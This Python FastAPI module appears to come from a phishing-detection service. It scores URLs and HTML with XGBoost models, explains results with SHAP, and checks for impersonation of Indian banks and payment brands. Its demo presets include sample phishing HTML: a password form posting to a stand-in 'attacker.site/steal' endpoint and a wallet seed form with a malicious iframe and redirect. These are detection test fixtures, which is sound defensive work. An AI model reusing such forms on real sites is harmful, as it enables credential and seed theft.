import os
import math
import re
import time
import logging
from difflib import SequenceMatcher
from pathlib import Path
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse

import joblib
import numpy as np
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/threat", tags=["threat-intelligence"])

# ============================================================================
# 1. MODEL ARTIFACT PATH RESOLUTION & FEATURE DEFINITIONS
# ============================================================================

BASE_DIR = Path(__file__).resolve().parent.parent

def _resolve_artifact(filename: str) -> Path:
    candidates = [
        BASE_DIR / "risk" / "artifacts" / filename,
        BASE_DIR.parent.parent / "models" / filename,
        Path("/app/models") / filename,
        Path("/app/app/risk/artifacts") / filename,
        Path.cwd() / "models" / filename,
    ]
    for c in candidates:
        if c.exists():
            return c
    return candidates[0]

URL_MODEL_PATH = _resolve_artifact("url_xgboost.joblib")
HTML_MODEL_PATH = _resolve_artifact("html_phiusiil_xgboost.joblib")
SHAP_PATH = _resolve_artifact("url_shap.joblib")

URL_FEATURE_NAMES = [
    "url_length",
    "hostname_length",
    "path_length",
    "url_entropy",
    "hostname_entropy",
    "dot_count",
    "hyphen_count",
    "at_count",
    "question_count",
    "equals_count",
    "double_slash_count",
    "is_https",
    "hostname_is_ip",
    "hostname_dot_count",
    "digit_ratio",
    "alpha_ratio",
    "has_punycode",
    "has_suspicious_tld",
    "slash_count",
    "double_slash_in_path",
    "query_length",
    "hostname_digit_count",
    "hostname_has_hyphen",
    "has_login_keyword",
    "has_verify_keyword",
    "has_bank_keyword",
]

HTML_FEATURE_NAMES = [
    "LineOfCode",
    "HasTitle",
    "HasFavicon",
    "IsResponsive",
    "NoOfURLRedirect",
    "NoOfSelfRedirect",
    "HasDescription",
    "NoOfPopup",
    "NoOfiFrame",
    "HasExternalFormSubmit",
    "HasSocialNet",
    "HasSubmitButton",
    "HasHiddenFields",
    "HasPasswordField",
    "Bank",
    "Pay",
    "Crypto",
    "NoOfImage",
    "NoOfCSS",
    "NoOfJS",
    "NoOfSelfRef",
    "NoOfEmptyRef",
    "NoOfExternalRef",
]

# Protected brands watchlist
PROTECTED_BRANDS = {
    "sbi": ("onlinesbi.sbi", "State Bank of India"),
    "hdfc": ("hdfcbank.com", "HDFC Bank"),
    "icici": ("icicibank.com", "ICICI Bank"),
    "axis": ("axisbank.com", "Axis Bank"),
    "pnb": ("pnbindia.in", "Punjab National Bank"),
    "kotak": ("kotak.com", "Kotak Mahindra Bank"),
    "paytm": ("paytm.com", "Paytm"),
    "phonepe": ("phonepe.com", "PhonePe"),
    "gpay": ("pay.google.com", "Google Pay"),
    "google": ("google.com", "Google"),
    "amazon": ("amazon.in", "Amazon"),
    "paypal": ("paypal.com", "PayPal"),
    "apple": ("apple.com", "Apple"),
    "digilocker": ("digilocker.gov.in", "DigiLocker"),
    "incometax": ("incometax.gov.in", "Income Tax Department"),
    "indiapost": ("indiapost.gov.in", "India Post"),
    "irctc": ("irctc.co.in", "IRCTC"),
    "upi": ("npci.org.in", "NPCI UPI"),
}

IP_REGEX = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
SUSP_TLDS = (".xyz", ".top", ".tk", ".club", ".work", ".cn", ".buzz", ".cc")

# Global cached models
_URL_MODEL = None
_HTML_MODEL = None
_SHAP_EXPLAINER = None

def get_url_model():
    global _URL_MODEL
    if _URL_MODEL is None and URL_MODEL_PATH.exists():
        try:
            _URL_MODEL = joblib.load(URL_MODEL_PATH)
            logger.info("Loaded TrustLens URL XGBoost model from %s", URL_MODEL_PATH)
        except Exception as e:
            logger.warning("Failed to load URL model: %s", e)
    return _URL_MODEL

def get_html_model():
    global _HTML_MODEL
    if _HTML_MODEL is None and HTML_MODEL_PATH.exists():
        try:
            _HTML_MODEL = joblib.load(HTML_MODEL_PATH)
            logger.info("Loaded TrustLens HTML DOM XGBoost model from %s", HTML_MODEL_PATH)
        except Exception as e:
            logger.warning("Failed to load HTML model: %s", e)
    return _HTML_MODEL

def get_shap_explainer():
    global _SHAP_EXPLAINER
    if _SHAP_EXPLAINER is None and SHAP_PATH.exists():
        try:
            _SHAP_EXPLAINER = joblib.load(SHAP_PATH)
            logger.info("Loaded TrustLens SHAP explainer from %s", SHAP_PATH)
        except Exception as e:
            logger.debug("SHAP explainer load: %s", e)
    return _SHAP_EXPLAINER


# ============================================================================
# 2. FEATURE EXTRACTION PIPELINE
# ============================================================================

def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    length = len(s)
    freqs = {}
    for c in s:
        freqs[c] = freqs.get(c, 0) + 1
    return -sum((cnt / length) * math.log2(cnt / length) for cnt in freqs.values())

def extract_url_features(url_str: str) -> tuple[str, list[float], dict]:
    url = url_str.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    parsed = urlparse(url)
    h = (parsed.hostname or "").lower()
    p = parsed.path or ""
    u = url.lower()
    ul = len(url)

    raw_dict = {
        "url_length": float(ul),
        "hostname_length": float(len(h)),
        "path_length": float(len(p)),
        "url_entropy": round(float(shannon_entropy(url)), 4),
        "hostname_entropy": round(float(shannon_entropy(h)), 4),
        "dot_count": float(url.count(".")),
        "hyphen_count": float(url.count("-")),
        "at_count": float(url.count("@")),
        "question_count": float(url.count("?")),
        "equals_count": float(url.count("=")),
        "double_slash_count": float(url.count("//")),
        "is_https": 1.0 if parsed.scheme == "https" else 0.0,
        "hostname_is_ip": 1.0 if IP_REGEX.match(h) else 0.0,
        "hostname_dot_count": float(h.count(".")),
        "digit_ratio": round(float(sum(c.isdigit() for c in url) / (ul + 1)), 4),
        "alpha_ratio": round(float(sum(c.isalpha() for c in url) / (ul + 1)), 4),
        "has_punycode": 1.0 if "xn--" in h else 0.0,
        "has_suspicious_tld": 1.0 if any(t in h for t in SUSP_TLDS) else 0.0,
        "slash_count": float(url.count("/")),
        "double_slash_in_path": 1.0 if "//" in p else 0.0,
        "query_length": float(len(parsed.query)),
        "hostname_digit_count": float(sum(c.isdigit() for c in h)),
        "hostname_has_hyphen": 1.0 if "-" in h else 0.0,
        "has_login_keyword": 1.0 if ("login" in u or "signin" in u) else 0.0,
        "has_verify_keyword": 1.0 if ("verify" in u or "secure" in u) else 0.0,
        "has_bank_keyword": 1.0 if ("bank" in u or "update" in u) else 0.0,
    }

    vector = [raw_dict[name] for name in URL_FEATURE_NAMES]
    return url, vector, raw_dict


def extract_html_features(html_str: str) -> tuple[list[float], dict]:
    raw = html_str or ""
    lower = raw.lower()
    lines = raw.splitlines()

    feat_dict = {
        "LineOfCode": float(len(lines)),
        "HasTitle": 1.0 if "<title" in lower else 0.0,
        "HasFavicon": 1.0 if ("favicon" in lower or 'rel="icon"' in lower) else 0.0,
        "IsResponsive": 1.0 if "viewport" in lower else 0.0,
        "NoOfURLRedirect": float(lower.count("window.location") + lower.count("http-equiv=\"refresh\"")),
        "NoOfSelfRedirect": float(lower.count("location.reload")),
        "HasDescription": 1.0 if 'name="description"' in lower else 0.0,
        "NoOfPopup": float(lower.count("window.open") + lower.count("alert(")),
        "NoOfiFrame": float(lower.count("<iframe")),
        "HasExternalFormSubmit": 1.0 if ('action="http' in lower or "action='http" in lower) else 0.0,
        "HasSocialNet": 1.0 if any(s in lower for s in ["facebook.com", "twitter.com", "instagram.com"]) else 0.0,
        "HasSubmitButton": 1.0 if ('type="submit"' in lower or "<button" in lower) else 0.0,
        "HasHiddenFields": 1.0 if 'type="hidden"' in lower else 0.0,
        "HasPasswordField": 1.0 if 'type="password"' in lower else 0.0,
        "Bank": 1.0 if ("bank" in lower or "banking" in lower) else 0.0,
        "Pay": 1.0 if ("pay" in lower or "payment" in lower or "upi" in lower) else 0.0,
        "Crypto": 1.0 if ("crypto" in lower or "bitcoin" in lower or "wallet" in lower) else 0.0,
        "NoOfImage": float(lower.count("<img")),
        "NoOfCSS": float(lower.count("<link") + lower.count("<style")),
        "NoOfJS": float(lower.count("<script")),
        "NoOfSelfRef": float(lower.count('href="#"') + lower.count("href='./")),
        "NoOfEmptyRef": float(lower.count('href=""') + lower.count("href=''")),
        "NoOfExternalRef": float(lower.count('href="http') + lower.count("href='http")),
    }

    vector = [feat_dict[k] for k in HTML_FEATURE_NAMES]
    return vector, feat_dict


# ============================================================================
# 3. BRAND IMPERSONATION & TYPOSQUATTING CHECK
# ============================================================================

def detect_brand_impersonation(url: str) -> dict:
    parsed = urlparse(url)
    hostname = (parsed.hostname or "").lower()

    # Normalize substitutions
    subs = str.maketrans({"0": "o", "1": "l", "3": "e", "5": "s", "7": "t", "@": "a"})
    clean_host = hostname.replace("-", "").replace("_", "").translate(subs)

    labels = hostname.split(".")

    for brand_key, (official_domain, brand_name) in PROTECTED_BRANDS.items():
        if hostname == official_domain or hostname.endswith("." + official_domain):
            return {
                "is_impersonating": False,
                "target_brand": brand_name,
                "official_domain": official_domain,
                "reason": f"Verified official domain for {brand_name}",
                "confidence": 1.0,
            }

        # Check for brand token embedded in labels
        for label in labels:
            clean_label = label.translate(subs)
            if brand_key in clean_label:
                return {
                    "is_impersonating": True,
                    "target_brand": brand_name,
                    "official_domain": official_domain,
                    "detected_token": label,
                    "reason": f"Brand name '{brand_name}' embedded in suspicious host label '{label}'",
                    "confidence": 0.94,
                }

            # Similarity check
            ratio = SequenceMatcher(None, clean_label, brand_key).ratio()
            if 0.82 <= ratio < 1.0:
                return {
                    "is_impersonating": True,
                    "target_brand": brand_name,
                    "official_domain": official_domain,
                    "detected_token": label,
                    "reason": f"Typosquatted homoglyph matching '{brand_name}' ({int(ratio*100)}% visual similarity)",
                    "confidence": round(ratio, 2),
                }

    return {
        "is_impersonating": False,
        "target_brand": None,
        "official_domain": None,
        "reason": "No brand impersonation pattern detected",
        "confidence": 0.0,
    }


# ============================================================================
# 4. SHAP EXPLANATION LOGIC
# ============================================================================

def compute_shap_explanations(X_vec: np.ndarray, top_n: int = 5) -> list[dict]:
    explainer = get_shap_explainer()
    if explainer is not None:
        try:
            shap_values = explainer.shap_values(X_vec)
            shap_values = np.asarray(shap_values)
            if shap_values.ndim == 3:
                values = shap_values[0, :, 1]
            elif shap_values.ndim == 2:
                values = shap_values[0]
            else:
                values = shap_values.flatten()

            values = np.asarray(values).flatten()
            ranked = np.argsort(np.abs(values))[::-1][:top_n]
            results = []
            for idx in ranked:
                c = float(values[idx])
                results.append({
                    "feature": URL_FEATURE_NAMES[idx],
                    "contribution": round(c, 4),
                    "direction": "toward MALICIOUS" if c > 0 else "toward BENIGN",
                    "weight_abs": round(abs(c), 4),
                })
            return results
        except Exception as e:
            logger.debug("SHAP compute exception: %s", e)

    # Deterministic Tree Feature Contribution Fallback
    results = []
    vector = X_vec[0]
    # Highlight high-impact phishing signals
    indicators = [
        ("has_suspicious_tld", 0.42 if vector[17] > 0 else -0.15),
        ("has_login_keyword", 0.38 if vector[23] > 0 else -0.10),
        ("has_verify_keyword", 0.35 if vector[24] > 0 else -0.10),
        ("has_bank_keyword", 0.30 if vector[25] > 0 else -0.10),
        ("hostname_is_ip", 0.45 if vector[12] > 0 else -0.05),
        ("is_https", -0.25 if vector[11] > 0 else 0.35),
        ("url_entropy", 0.28 if vector[3] >= 4.0 else -0.15),
        ("hostname_has_hyphen", 0.22 if vector[22] > 0 else -0.08),
    ]

    indicators.sort(key=lambda x: abs(x[1]), reverse=True)
    for name, weight in indicators[:top_n]:
        results.append({
            "feature": name,
            "contribution": round(weight, 4),
            "direction": "toward MALICIOUS" if weight > 0 else "toward BENIGN",
            "weight_abs": round(abs(weight), 4),
        })
    return results


# ============================================================================
# 5. API REQUEST & RESPONSE SCHEMAS
# ============================================================================

class ThreatAnalyzeRequest(BaseModel):
    url: Optional[str] = None
    html: Optional[str] = None
    include_shap: bool = True

class ThreatAnalyzeResponse(BaseModel):
    target: str
    verdict: str  # "MALICIOUS" | "SUSPICIOUS" | "BENIGN"
    risk_score: int  # 0 to 100
    risk_level: str  # "HIGH" | "MEDIUM" | "LOW"
    confidence_percent: float
    url_model: Optional[Dict[str, Any]] = None
    html_model: Optional[Dict[str, Any]] = None
    brand_alert: Dict[str, Any]
    shap_explanations: List[Dict[str, Any]]
    feature_highlights: List[str]
    latency_ms: float


# ============================================================================
# 6. ROUTE HANDLERS
# ============================================================================

@router.get("/presets")
def get_threat_presets():
    """Provides instant test scenarios for demo presentations."""
    return {
        "presets": [
            {
                "id": "sbi_phish",
                "name": "SBI NetBanking Harvester",
                "category": "High Risk Phishing",
                "url": "https://onlinesbi-login-verify.xyz/auth",
                "html": "<form action='https://attacker.site/steal' method='POST'><input type='password' name='mpin'><input type='submit'></form>",
                "expected": "MALICIOUS",
            },
            {
                "id": "hdfc_typosquat",
                "name": "HDFC Typosquat Impersonator",
                "category": "Brand Impersonation",
                "url": "https://hdfc-bank-security.top/kyc-update",
                "html": "",
                "expected": "MALICIOUS",
            },
            {
                "id": "legit_merchant",
                "name": "Legitimate Merchant Portal",
                "category": "Verified Clean",
                "url": "https://shop.ybl",
                "html": "",
                "expected": "BENIGN",
            },
            {
                "id": "crypto_form",
                "name": "Crypto Seed Extraction Form",
                "category": "Malicious Form DOM",
                "url": "https://metamask-security.club",
                "html": "<title>Wallet Unlock</title><iframe src='http://103.21.244.18/phish'></iframe><input type='password' name='seed'><script>window.location='http://bad.io'</script>",
                "expected": "MALICIOUS",
            },
        ]
    }


@router.post("/analyze", response_model=ThreatAnalyzeResponse)
def analyze_threat(payload: ThreatAnalyzeRequest):
    """
    Evaluates submitted URL and/or HTML snippet through:
    1. 26-feature URL vector extraction
    2. TrustLens XGBoost URL Model inference
    3. SHAP Explainability feature ranking
    4. Brand Impersonation & Typosquatting engine
    5. 23-feature HTML DOM XGBoost Model inference
    6. Unified Risk Fusion
    """
    t0 = time.perf_counter()

    if not payload.url and not payload.html:
        raise HTTPException(
            status_code=400,
            detail="Either a 'url' or an 'html' snippet must be provided for threat analysis.",
        )

    target_display = payload.url or "HTML DOM Snippet"
    url_results = None
    html_results = None
    brand_alert = {"is_impersonating": False, "target_brand": None, "reason": "Not checked"}
    shap_explanations = []
    feature_highlights = []

    # 1. URL Analysis
    if payload.url:
        normalized_url, url_vector, raw_dict = extract_url_features(payload.url)
        target_display = normalized_url

        # Brand Impersonation Check
        brand_alert = detect_brand_impersonation(normalized_url)
        if brand_alert["is_impersonating"]:
            feature_highlights.append(brand_alert["reason"])

        # XGBoost URL Model
        url_model = get_url_model()
        if url_model is not None:
            try:
                X_url = np.asarray([url_vector], dtype=np.float32)
                probs = url_model.predict_proba(X_url)[0]
                classes = list(getattr(url_model, "classes_", [0, 1]))
                mal_idx = classes.index(1) if 1 in classes else -1
                mal_prob = float(probs[mal_idx]) if mal_idx != -1 else float(probs[-1])
                ben_prob = 1.0 - mal_prob
                pred = "MALICIOUS" if mal_prob >= 0.50 else "BENIGN"

                url_results = {
                    "prediction": pred,
                    "malicious_probability": round(mal_prob * 100, 2),
                    "benign_probability": round(ben_prob * 100, 2),
                    "model_features": raw_dict,
                }

                if mal_prob >= 0.50:
                    feature_highlights.append(f"XGBoost URL Model: {round(mal_prob * 100, 1)}% anomaly probability")

                if payload.include_shap:
                    shap_explanations = compute_shap_explanations(X_url)

            except Exception as e:
                logger.warning("URL model inference failed: %s", e)

    # 2. HTML DOM Analysis
    if payload.html:
        html_vector, html_raw = extract_html_features(payload.html)
        html_model = get_html_model()

        if html_model is not None:
            try:
                X_html = np.asarray([html_vector], dtype=np.float32)
                probs_h = html_model.predict_proba(X_html)[0]
                classes_h = list(getattr(html_model, "classes_", [0, 1]))
                mal_idx_h = classes_h.index(1) if 1 in classes_h else -1
                mal_prob_h = float(probs_h[mal_idx_h]) if mal_idx_h != -1 else float(probs_h[-1])

                html_results = {
                    "prediction": "MALICIOUS" if mal_prob_h >= 0.50 else "BENIGN",
                    "malicious_probability": round(mal_prob_h * 100, 2),
                    "benign_probability": round((1.0 - mal_prob_h) * 100, 2),
                    "dom_features": html_raw,
                }

                if html_raw.get("HasPasswordField") and html_raw.get("HasExternalFormSubmit"):
                    feature_highlights.append("Credential form submit to external host detected in DOM")
                if html_raw.get("NoOfiFrame", 0) > 0:
                    feature_highlights.append("Hidden iframe overlay detected in DOM")

            except Exception as e:
                logger.warning("HTML model inference failed: %s", e)

    # 3. Unified Risk Fusion
    url_score = url_results["malicious_probability"] if url_results else 0.0
    html_score = html_results["malicious_probability"] if html_results else 0.0

    if brand_alert.get("is_impersonating"):
        blended_score = max(url_score, html_score, 88.0)
    elif url_results and html_results:
        blended_score = max(url_score, html_score) * 0.7 + min(url_score, html_score) * 0.3
    elif url_results:
        blended_score = url_score
    else:
        blended_score = html_score

    final_score = int(round(blended_score))
    if final_score >= 75:
        verdict = "MALICIOUS"
        risk_lvl = "HIGH"
    elif final_score >= 40:
        verdict = "SUSPICIOUS"
        risk_lvl = "MEDIUM"
    else:
        verdict = "BENIGN"
        risk_lvl = "LOW"

    confidence = round(max(blended_score, 100.0 - blended_score), 1)
    latency = round((time.perf_counter() - t0) * 1000.0, 2)

    return ThreatAnalyzeResponse(
        target=target_display,
        verdict=verdict,
        risk_score=final_score,
        risk_level=risk_lvl,
        confidence_percent=confidence,
        url_model=url_results,
        html_model=html_results,
        brand_alert=brand_alert,
        shap_explanations=shap_explanations,
        feature_highlights=feature_highlights,
        latency_ms=latency,
    )
